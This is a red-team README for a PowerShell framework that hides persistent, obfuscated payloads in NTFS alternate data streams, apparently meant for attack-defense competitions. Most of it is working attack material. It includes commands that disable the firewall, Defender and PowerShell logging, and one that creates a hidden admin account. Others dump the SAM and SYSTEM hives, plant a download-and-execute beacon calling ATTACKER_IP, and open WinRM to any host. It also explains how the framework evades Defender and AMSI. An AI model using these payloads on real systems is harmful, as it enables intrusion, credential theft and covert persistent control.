# Red Team Showcase — Apparition Delivery System v2.4

**For:** Red team briefings, onboarding, and live demos
**Run the companion script:** `tests/red-team-showcase.ps1` to auto-generate all deployment one-liners

---

## What You Just Got

You have a framework that hides persistent, encrypted PowerShell execution inside NTFS Alternate Data Streams. It's invisible to dir and explorer, and it's running clean against Windows Defender as of this writing. A task fires at every logon, every boot, every 5 minutes on a randomized schedule (choices are yours). The files look like Windows cache artifacts. The task names look like Windows maintenance tasks. The streams don't appear at all unless you specifically look at the streams, and the zerowidth unicode option can make deleting it a pain.

Every payload below is one generate-on-Kali + paste-on-Windows operation. No uploads. No staging servers (unless you use this as an agent waiting to be served powershell script). No compiled binaries.

---

## Section A: Things That Matter — Impact Payloads

High-value, competition-winning moves. All generate-on-Kali, paste-on-Windows.

---

### A1: Firewall Down (FW-002)

**What it does:** Disables all Windows Firewall profiles in a single netsh call. Fast, reliable, no PowerShell cmdlets in logs.

**Validate:** `cmd /c "netsh advfirewall show allprofiles state"` — shows `OFF` for Domain, Private, and Public profiles.

**Defender status:** VM-Validated CLEAN (2026-02-19, T8 test, Win11 Build 26200, Defender SigV 1.445.152.0)

```bash
# Generate on Kali — 3 redundant instances, Advanced stealth, registry persist
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'cmd /c "netsh advfirewall set allprofiles state off"' \
  -Obfuscate Advanced \
  -Persist registry \
  -InstanceCount 3 \
  -OutputFile /tmp/showcase-a1-fw.txt
```

**On Windows:** Paste OPTION 1 as Administrator. Firewall goes down immediately. Three persistence paths installed — blue team can find and delete one, or two. Good luck finding all three.

A more nuclear and silent option below (best saved to a file and run with -PayloadFile):

Stop-Process -Name SecurityHealthSystray -Force -ErrorAction SilentlyContinue; Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'SecurityHealth' -ErrorAction SilentlyContinue; $notifPath='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications'; if (-not (Test-Path $notifPath)) { New-Item -Path $notifPath -Force | Out-Null }; Set-ItemProperty -Path $notifPath -Name 'DisableNotifications' -Type DWord -Value 1; Set-ItemProperty -Path $notifPath -Name 'DisableEnhancedNotifications' -Type DWord -Value 1; $acPath='HKLM:\SOFTWARE\Microsoft\Security Center'; Set-ItemProperty -Path $acPath -Name 'FirewallDisableNotify' -Type DWord -Value 1 -ErrorAction SilentlyContinue; $wscPath='HKLM:\SOFTWARE\Microsoft\Security Center\Notifications'; if (-not (Test-Path $wscPath)) { New-Item -Path $wscPath -Force | Out-Null }; Set-ItemProperty -Path $wscPath -Name 'DisableNotifications' -Type DWord -Value 1; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue; Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

---

### A2: Invisible Admin Account (USR-002) (remote login test needed, my local vm to vm not playing nice)

**What it does:** Creates a local administrator account hidden from the Windows login screen and the User Accounts panel. `net user` reveals it if you know to look. Control Panel, Settings > Accounts, and the login screen don't.

**Validate:** `net user svcUpdate` shows the account. Click Start → User Accounts panel → account not listed.

**Defender status:** VM-Validated CLEAN (2026-02-19, T9 test)

```bash
cat > /tmp/usr002.ps1 << 'EOF'
cmd /c "net user svcUpdate Pa$$w0rd2026! /add & net localgroup Administrators svcUpdate /add"
$p='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null}
New-ItemProperty -Path $p -Name svcUpdate -Value 0 -PropertyType DWord -Force|Out-Null
EOF

pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile /tmp/usr002.ps1 \
  -Obfuscate Advanced \
  -OutputFile /tmp/showcase-a2-admin.txt
```

**RDP with it:** `xfreerdp /v:TARGET /u:svcUpdate /p:'Pa$$w0rd2026!'`

---

### A3: Credential Harvest — SAM + SYSTEM Hives (CRED-001)

**What it does:** Dumps the SAM and SYSTEM registry hives to `C:\ProgramData` for offline cracking. Tasks run as SYSTEM — the account has the access rights. Files stage themselves, you just need to exfil.

**Validate:** Files `C:\ProgramData\s.dat` and `C:\ProgramData\sy.dat` appear after task fires.

**Crack on Kali:** `secretsdump.py -sam s.dat -system sy.dat LOCAL` (impacket)

**Defender status:** VM-Validated CLEAN (2026-02-19, T10 test)

```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'cmd /c "reg save HKLM\SAM C:\ProgramData\s.dat /y & reg save HKLM\SYSTEM C:\ProgramData\sy.dat /y"' \
  -Obfuscate Advanced \
  -OutputFile /tmp/showcase-a3-creds.txt
```

**Exfil the files:** `scp admin@TARGET:'C:\ProgramData\s.dat' .` (if WinRM/PSRemoting is up) or use EXFIL-002 (HTTP) or just C&C over your existing session.

---

### A4: Full C2 Cradle — Persistent Download Beacon (C2-001) (saw connect callback, need to test payload delivery)

**What it does:** Installs a persistent download-and-execute beacon that fires every 5 minutes. Points to your HTTP server. When your server returns a PowerShell script, it executes it. When it returns empty, nothing happens. Fire-and-forget command execution.

```bash
# First: start your HTTP server on Kali
# python3 -m http.server 8080
# Or: nc -lvnp 8080 for task responses

# Generate and deploy the beacon
cat > /tmp/c2cradle.ps1 << 'EOF'
$w=New-Object Net.WebClient
$s=$w.DownloadString('http://ATTACKER_IP:8080/agent.ps1')
[scriptblock]::Create($s).Invoke()
EOF

pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile /tmp/c2cradle.ps1 \
  -Obfuscate Advanced \
  -Persist task \
  -PeriodicMinutes 5 \
  -JitterPercent 20 \
  -InstanceCount 2 \
  -OutputFile /tmp/showcase-a4-c2.txt
```

**Replace `ATTACKER_IP` with your Kali IP before generating.**

---

### A5: Lateral Movement Prep — WinRM + PSRemoting (LAT-001 + LAT-002) (need to test on machine with winrm on a network)

**What it does:** Opens WinRM and enables PowerShell Remoting with wildcard TrustedHosts. After this fires, you can `Enter-PSSession -ComputerName TARGET -Credential ...` from anywhere on the network.

```bash
cat > /tmp/lateral.ps1 << 'EOF'
cmd /c "winrm quickconfig -quiet"
Enable-PSRemoting -Force -SkipNetworkProfileCheck
Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
EOF

pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile /tmp/lateral.ps1 \
  -Obfuscate Advanced \
  -Persist task \
  -OutputFile /tmp/showcase-a5-lateral.txt
```

**After it fires from Kali:**
```bash
pwsh -Command "Enter-PSSession -ComputerName TARGET -Credential (Get-Credential)"
```

---

## Section B: Finding Us Is Hard — Blue Team Detection Difficulty

Why ADS makes the blue team's job genuinely difficult. Not just hard — *differently* hard.

---

### The Stream Is Invisible

`dir C:\ProgramData` — nothing unusual. `Get-ChildItem C:\ProgramData` — nothing unusual.

The only way to find our streams is:
- **`dir /r C:\ProgramData`** (cmd) — shows stream sizes as extra lines, easy to miss
- **`Get-Item <file> -Stream *`** (PowerShell) — explicit stream enumeration
- **Sysmon Event 15** (FileCreateStreamHash) — fires on ADS creation (a normal event), needs Sysmon installed and careful monitoring

In a competition environment with blue team triaging 40 machines? They'll find most things first. The ADS is last.

---

### Task Names Look Like Windows

Advanced/Paranoid tier task names come from a curated word list: `DiskMaintenanceService`, `TPMDiagnosticsTask`, `NetworkProfileSync`, `MemoryDiagnosticWorker`. These look exactly like legitimate Windows background tasks.

```
Task Scheduler → look for suspicious tasks → 200 entries → which ones did Windows create?
```

Compare to what we create:
- `DiskMaintenanceService` — scheduled task, Microsoft\Windows\WinSAT path
- Real Windows equivalent: `WinSAT`, `SilentCleanup`, `DiskDiagnosticDataCollector`

Not impossible to find. Just genuinely time-consuming to distinguish.

---

### The Payload Doesn't Exist on Disk

The payload is stored inside an NTFS ADS — a fork of a legitimate system file in `C:\ProgramData\Microsoft\Windows\WER\Cache`. The main file (the host) looks normal. Its content is whatever it was before we touched it. Our payload is in a named fork of that file. Standard file scanning doesn't see it.

If `-Encrypt` is used, the ADS content is a DPAPI-encrypted blob. Even if someone finds the stream, they need the machine's DPAPI master key to read it.

If ZeroWidthStream is used, they need the exact character used, or delete the entire file (hopfully we didn't attach to an important one and/or they made a backup first).

---

### Defender Can't See the Compound

Defender's ClickFix.TFC signature triggers on the compound of DPAPI + MachineGuid + XOR AMSI bypass + scheduled task creation appearing together in a scannable command. ADS v2.4 hides that compound inside a DeflateStream-compressed base64 blob (`-EncodedCommand`). The command line Defender sees is:

```
powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand AAABBB...
```

That's it. The compound is only visible after decompression inside the PS runtime — at which point AMSI bypass (Layer B, in the JScript stub) has already fired.

**Validated clean:** T3-v2, T11-v2 (Session 16), T8/T9/T10/M1-M4 (2026-02-19). Zero Defender Event 1116 across all tests.

---

### wscript.exe, Not powershell.exe

Task Scheduler doesn't execute PowerShell directly. It executes:
```
wscript.exe //B C:\ProgramData\Microsoft\Windows\WER\Cache\<random>.js
```

The JScript file contains a one-liner that calls PowerShell with the compressed payload. The process tree is:
```
svchost.exe (taskeng) → wscript.exe → powershell.exe -EncodedCommand ...
```

Blue team looking for `Register-ScheduledTask` in command lines? Not there. Looking for PowerShell spawned by taskeng? It's one process, with an EncodedCommand argument that decodes to a DeflateStream stub. That stub decompresses and invokes the actual payload.

---

### Zero-Width Streams (Paranoid Tier)

In Paranoid mode, the ADS stream name contains zero-width Unicode codepoints (U+200B, U+200C, U+FEFF). The stream name displays as blank or invisible in most tools:

```
C:\ProgramData\Microsoft\Windows\WER\Cache\cache.cab:     (3.1 KB)
```

That trailing space is our stream. You cannot type it. You cannot grep it. You need the exact codepoints from the manifest to reconstruct it for cleanup. Even `Get-Item -Stream *` shows it — but only if you're looking, and only if you already know it might be there.

---

## Section C: Mess With The Blue Team — Meme Delivery

Because sometimes you need to let them know you were there.

**Key note:** Memes that require a visible user interface (windows, audio, mouse) need `-Persist registry`. Registry Run keys fire in the user's logon session. Scheduled tasks run as SYSTEM in Session 0 with no visible desktop.

---

### C1: Clipboard Rickroll (MEME-006) — SYSTEM OK

**What it does:** Replaces the clipboard contents every 30 seconds with your message. Works from SYSTEM context — the clipboard is shared. Every time the blue team copies a command to paste somewhere, they get a surprise.

**Defender status:** VM-Validated CLEAN (2026-02-19, M1 test)

```bash
cat > /tmp/meme006.ps1 << 'EOF'
Add-Type -AssemblyName PresentationCore
while($true) {
  [Windows.Clipboard]::SetText('Never gonna give you up — Red Team was here — <3')
  Start-Sleep -Seconds 30
}
EOF

pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile /tmp/meme006.ps1 \
  -Obfuscate Basic \
  -OutputFile /tmp/showcase-c1-clip.txt
```

---

### C2: Caps Lock Disco (MEME-005) — SYSTEM OK

**What it does:** Blinks Caps Lock, Num Lock, and Scroll Lock LEDs in a rapid sequence for 60 seconds (time-limited for competition safety). Physical keyboard LEDs react even to SYSTEM context key events. Might be my favorite.

**Defender status:** VM-Validated CLEAN (2026-02-19, M2 test)

```bash
cat > /tmp/meme005.ps1 << 'EOF'
$wsh = New-Object -ComObject WScript.Shell
$end = (Get-Date).AddSeconds(60)
while ((Get-Date) -lt $end) {
  $wsh.SendKeys('{CAPSLOCK}')
  $wsh.SendKeys('{NUMLOCK}')
  $wsh.SendKeys('{SCROLLLOCK}')
  Start-Sleep -Milliseconds 250
}
EOF

pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile /tmp/meme005.ps1 \
  -Obfuscate Basic \
  -OutputFile /tmp/showcase-c2-caps.txt
```

---

### C3: Matrix Rain (MEME-004) — SYSTEM OK

**What it does:** Spawns a console window with a Matrix rain animation for 2 minutes. Works from Task Scheduler (SYSTEM context spawns a visible console). Time-limited — exits cleanly after the run.

**Defender status:** VM-Validated CLEAN (2026-02-19, M3 test)

```bash
cat > /tmp/meme004.ps1 << 'EOF'
$host.UI.RawUI.WindowTitle = 'System Diagnostics'
$host.UI.RawUI.BackgroundColor = 'Black'
$host.UI.RawUI.ForegroundColor = 'Green'
Clear-Host
$chars = @('0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F')
$width = $host.UI.RawUI.WindowSize.Width
$cols = @{}
$end = (Get-Date).AddMinutes(2)
while ((Get-Date) -lt $end) {
  $col = Get-Random -Minimum 0 -Maximum $width
  $char = $chars[(Get-Random -Maximum $chars.Count)]
  $pos = New-Object System.Management.Automation.Host.Coordinates $col, (Get-Random -Minimum 0 -Maximum $host.UI.RawUI.WindowSize.Height)
  $host.UI.RawUI.CursorPosition = $pos
  Write-Host $char -NoNewline -ForegroundColor Green
  Start-Sleep -Milliseconds 20
}
EOF

pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile /tmp/meme004.ps1 \
  -Obfuscate Basic \
  -OutputFile /tmp/showcase-c3-matrix.txt
```

---

### C4: Wall of Notepads (MEME-002) — Registry Persist Required

**What it does:** Opens 10 cascading Notepad windows with a red team message when the user logs on. Each window opens in the user's interactive session with your message front and center. (pretty funny tbh, but it can really spam the windows)

**Defender status:** VM-Validated CLEAN (2026-02-19, M4 test, with `-Persist registry`)

```bash
cat > /tmp/meme002.ps1 << 'EOF'
1..10 | ForEach-Object {
  Start-Process notepad
  Start-Sleep -Milliseconds 300
}
EOF

pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile /tmp/meme002.ps1 \
  -Persist registry \
  -Obfuscate Basic \
  -OutputFile /tmp/showcase-c4-notepads.txt
```

---

### C5: OIIA Spinning Proof-of-Compromise (MEME-008) — Registry Persist Required

**What it does:** Spawns a visible console that displays a spinning ASCII cat animation for 30 seconds, then prints live recon: hostname, username, privilege level, local admin count, and timestamp. Proof that you were there, in the most delightful possible format. (it interrupts a powershell session in an annoying way)

```bash
cat > /tmp/meme008.ps1 << 'EOF'
$frames = @('(=^._.^=)','(=^._.^)=','(^._.^=)=','=(^._.^)=')
$end = (Get-Date).AddSeconds(30)
$i = 0
while ((Get-Date) -lt $end) {
  [Console]::SetCursorPosition(0,0)
  Write-Host $frames[$i % 4] -ForegroundColor Cyan
  Write-Host "RED TEAM WAS HERE — ADS v2.4" -ForegroundColor Red
  $i++; Start-Sleep -Milliseconds 250
}
Write-Host "`n=== PROOF OF COMPROMISE ===" -ForegroundColor Red
Write-Host "Hostname : $env:COMPUTERNAME"
Write-Host "User     : $env:USERNAME"
Write-Host "Admin    : $((net localgroup administrators 2>$null | Where-Object { $_ -match '\\' }).Count) accounts"
Write-Host "Time     : $(Get-Date)"
Start-Sleep -Seconds 10
EOF

pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile /tmp/meme008.ps1 \
  -Persist registry \
  -Obfuscate Basic \
  -OutputFile /tmp/showcase-c5-oiia-spin.txt
```

---

### C6: OIIA Desktop Graffiti (MEME-009) — SYSTEM OK

**What it does:** Drops `OIIA_RED_TEAM_WAS_HERE.txt` on the Desktop, Public Desktop, and Temp — visible in File Explorer on next logon. Works from SYSTEM context (no interactive session needed). The files contain an ASCII cat and proof-of-compromise information.

```bash
cat > /tmp/meme009.ps1 << 'EOF'
$msg = @"
+------------------------------------------+
|     OIIA — RED TEAM WAS HERE             |
|     Apparition Delivery System v2.4      |
|     "Execution without presence"         |
+------------------------------------------+
Hostname : $env:COMPUTERNAME
User     : $env:USERNAME
Time     : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@
@(
  "C:\Users\Public\Desktop\OIIA_RED_TEAM_WAS_HERE.txt",
  "$env:TEMP\OIIA_RED_TEAM_WAS_HERE.txt"
) | ForEach-Object { $msg | Out-File -FilePath $_ -Force -Encoding UTF8 -EA 0 }
EOF

pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile /tmp/meme009.ps1 \
  -Obfuscate Advanced \
  -OutputFile /tmp/showcase-c6-oiia-graffiti.txt
```

---

## Section D: Power Plays — Combo Scenarios (testing needed)

Multiple effects, one deployment. Choose your chaos level.

---

### D1: Initial Access Package — "I Just Got On This Box"

**What it does:** Four actions in one task:
1. Firewall off (FW-002 approach)
2. RDP enabled, NLA disabled (RDP-002 approach)
3. Hidden admin account created (USR-002 approach)
4. PowerShell Script Block Logging disabled (DEF-003 approach)

Blue team now has to close four separate attack paths just to get back to baseline. And it'll re-install on the next logon.

```bash
cat > /tmp/combo-initial.ps1 << 'EOF'
# Firewall down
cmd /c "netsh advfirewall set allprofiles state off"

# RDP enabled, NLA off
$r='HKLM:\System\CurrentControlSet\Control\Terminal Server'
Set-ItemProperty $r -Name fDenyTSConnections -Value 0
Set-ItemProperty "$r\WinStations\RDP-Tcp" -Name UserAuthentication -Value 0
cmd /c 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes'

# Hidden admin
cmd /c "net user svcUpdate Pa$$w0rd2026! /add & net localgroup Administrators svcUpdate /add"
$p='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null}
New-ItemProperty -Path $p -Name svcUpdate -Value 0 -PropertyType DWord -Force|Out-Null

# Disable PowerShell logging (do this last so it doesn't log itself)
$lp='HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell'
@('ScriptBlockLogging','ModuleLogging','Transcription') | ForEach-Object {
  $kp="$lp\$_"; if(!(Test-Path $kp)){New-Item $kp -Force|Out-Null}
  Set-ItemProperty $kp -Name "Enable$_" -Value 0 -Type DWord -Force
}
EOF

pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile /tmp/combo-initial.ps1 \
  -Obfuscate Advanced \
  -Persist task \
  -Trigger @('AtLogOn','AtStartup','OnUnlock') \
  -InstanceCount 2 \
  -OutputFile /tmp/showcase-d1-initial-access.txt
```

---

### D2: Stealth Long Game

**What it does:** Quiet persistence with credential harvest. Designed to run undetected for as long as possible.
1. Credential dump staged to ProgramData (pick up later)
2. Defender real-time monitoring disabled via policy (silent)
3. PS logging disabled (prevents forensic trail)

```bash
cat > /tmp/combo-stealth.ps1 << 'EOF'
# Credential harvest — stage for later pickup
cmd /c "reg save HKLM\SAM C:\ProgramData\s.dat /y & reg save HKLM\SYSTEM C:\ProgramData\sy.dat /y"

# Disable Defender real-time monitoring via policy registry (quieter than stopping service)
$p='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null}
Set-ItemProperty -Path $p -Name DisableAntiSpyware -Value 1 -Type DWord -Force
$rp="$p\Real-Time Protection"
if(!(Test-Path $rp)){New-Item -Path $rp -Force|Out-Null}
Set-ItemProperty -Path $rp -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force

# Disable PowerShell Script Block Logging
$lp='HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
if(!(Test-Path $lp)){New-Item $lp -Force|Out-Null}
Set-ItemProperty $lp -Name EnableScriptBlockLogging -Value 0 -Type DWord -Force
EOF

pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile /tmp/combo-stealth.ps1 \
  -Obfuscate Paranoid \
  -Persist task \
  -PeriodicMinutes 10 \
  -JitterPercent 30 \
  -OutputFile /tmp/showcase-d2-stealth.txt
```

---

### D3: Chaos Mode — Three Memes Simultaneously

**What it does:** Deploys three independent meme payloads via registry persistence. Fires at the user's next logon:
- Clipboard content replaced every 30 seconds
- Keyboard LEDs blinking for 60 seconds
- Wall of Notepads cascades across the desktop

```bash
# Generate three separate registry persist one-liners
cat > /tmp/chaos-clip.ps1 << 'EOF'
Add-Type -AssemblyName PresentationCore
while($true){ [Windows.Clipboard]::SetText('RED TEAM WAS HERE — ADS v2.4'); Start-Sleep 30 }
EOF

cat > /tmp/chaos-caps.ps1 << 'EOF'
$w=New-Object -ComObject WScript.Shell; $e=(Get-Date).AddSeconds(60)
while((Get-Date)-lt $e){ $w.SendKeys('{CAPSLOCK}'); $w.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 300 }
EOF

cat > /tmp/chaos-note.ps1 << 'EOF'
1..8 | ForEach-Object { Start-Process notepad; Start-Sleep -Milliseconds 300 }
EOF

pwsh src/ADS-OneLiner.ps1 -PayloadFile /tmp/chaos-clip.ps1 -Persist registry -Obfuscate Basic -OutputFile /tmp/showcase-d3-chaos-clip.txt
pwsh src/ADS-OneLiner.ps1 -PayloadFile /tmp/chaos-caps.ps1 -Persist registry -Obfuscate Basic -OutputFile /tmp/showcase-d3-chaos-caps.txt
pwsh src/ADS-OneLiner.ps1 -PayloadFile /tmp/chaos-note.ps1 -Persist registry -Obfuscate Basic -OutputFile /tmp/showcase-d3-chaos-note.txt
```

Paste all three OPTION 1 lines on Windows. Next logon: clipboard hijacked + LEDs blinking + Notepad waterfall.

---

## Quick Reference — Scenario Matrix

| Scenario | File | Persist | Admin? | Context | Validated |
|----------|------|---------|--------|---------|-----------|
| A1 Firewall Down | `showcase-a1-fw.txt` | registry | Yes | SYSTEM | CLEAN 2026-02-19 |
| A2 Hidden Admin | `showcase-a2-admin.txt` | task | Yes | SYSTEM | CLEAN 2026-02-19 |
| A3 Cred Harvest | `showcase-a3-creds.txt` | task | Yes | SYSTEM | CLEAN 2026-02-19 |
| A4 C2 Cradle | `showcase-a4-c2.txt` | task | Yes | SYSTEM | Pending (replace IP) |
| A5 Lateral Prep | `showcase-a5-lateral.txt` | task | Yes | SYSTEM | Pending |
| C1 Clipboard | `showcase-c1-clip.txt` | task | No | SYSTEM | CLEAN 2026-02-19 |
| C2 Caps Disco | `showcase-c2-caps.txt` | task | No | SYSTEM | CLEAN 2026-02-19 |
| C3 Matrix | `showcase-c3-matrix.txt` | task | No | SYSTEM | CLEAN 2026-02-19 |
| C4 Notepads | `showcase-c4-notepads.txt` | **registry** | No | **User** | CLEAN 2026-02-19 |
| C5 OIIA Spin | `showcase-c5-oiia-spin.txt` | **registry** | No | **User** | Unvalidated |
| C6 OIIA Graffiti | `showcase-c6-oiia-graffiti.txt` | task | No | SYSTEM | Unvalidated |
| D1 Initial Access | `showcase-d1-initial-access.txt` | task | Yes | SYSTEM | Pending |
| D2 Stealth Long | `showcase-d2-stealth.txt` | task | Yes | SYSTEM | Pending |
| D3 Chaos (x3) | `showcase-d3-chaos-*.txt` | **registry** | No | **User** | CLEAN (each meme) |

---

## Generate All at Once

```bash
# Run the companion script to generate all scenarios in one shot
pwsh tests/red-team-showcase.ps1 -OutputDir /tmp/showcase/

# List what was generated
ls -la /tmp/showcase/

# Deploy a specific scenario
cat /tmp/showcase/showcase-a1-fw.txt
```

See `tests/red-team-showcase.ps1 -Help` for options.
